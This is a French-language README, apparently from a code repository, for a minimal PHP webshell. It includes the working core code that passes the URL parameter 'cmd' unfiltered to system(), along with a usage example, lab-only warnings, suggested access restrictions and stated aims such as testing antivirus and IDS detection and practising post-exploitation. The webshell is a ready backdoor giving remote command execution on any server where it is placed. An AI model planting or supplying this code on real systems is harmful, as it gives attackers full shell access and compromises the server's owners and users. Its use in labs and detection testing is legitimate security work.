# 🐚 PHP WebShell – Interface Commande à Distance

Ce projet est un **WebShell PHP minimaliste** permettant l’exécution de commandes système via une interface web. Il est destiné uniquement à des usages **éducatifs ou en environnement de test local (CTF, lab personnel)**.

---

## ⚠️ Avertissement

> ❗️Ce script donne un accès total au shell du serveur.
>
> **NE JAMAIS déployer ce WebShell sur un serveur en production.**  
> Son usage peut compromettre l'intégrité, la confidentialité et la disponibilité du système.

---

## 📋 Fonctionnalités

- Interface web simple en HTML/CSS
- Exécution de commandes système en GET (`?cmd=`)
- Résultats affichés dans un `<pre>` stylisé
- Échappement de la commande affichée via `htmlspecialchars()` (mais pas de la commande exécutée)

---

## 🔧 Exemple d'utilisation

Accès local via navigateur :

```
http://localhost/webshell.php?cmd=whoami
```

Affiche :

```bash
$ whoami
www-data
```

---

## 🖼️ Aperçu visuel

![WebShell screenshot](https://via.placeholder.com/600x300?text=WebShell+interface)

---

## 📂 Fichiers

- `webshell.php` – Interface WebShell
- Aucune dépendance externe requise

---

## 🛡️ Sécurisation (si utilisé en CTF ou lab isolé)

Si vous devez exposer ce script temporairement :

- Restreignez par IP (`.htaccess`, `nginx allow`)
- Protégez avec un `.htpasswd` ou token simple
- Évitez l’exécution via `root`
- Supprimez le script dès la session terminée

---

## 📜 Code source (extrait)

```php
<?php
    if (isset($_GET['cmd'])) {
        echo "<span style='color: #6A9955;'>$ </span>" . htmlspecialchars($_GET['cmd']) . "\n";
        system($_GET['cmd'] . ' 2>&1');
    }
?>
```

---

## 📚 Notes

- La commande est envoyée en **GET**, donc visible dans l’historique du navigateur et dans les logs.
- Pour l’exécution en POST, adaptez simplement le formulaire et utilisez `$_POST['cmd']`.

---

## 🧠 Objectifs pédagogiques

Ce projet permet de :

- Comprendre les risques liés à `system()` et à l'exécution de code non filtré
- Tester la détection d'antivirus ou d'IDS
- Entraîner des techniques de post-exploitation

---

## 🔒 Disclaimer

> Ce projet est uniquement destiné à des **finalités pédagogiques et de sécurité offensive éthique**.  
> L'auteur **décline toute responsabilité** en cas de mauvaise utilisation.
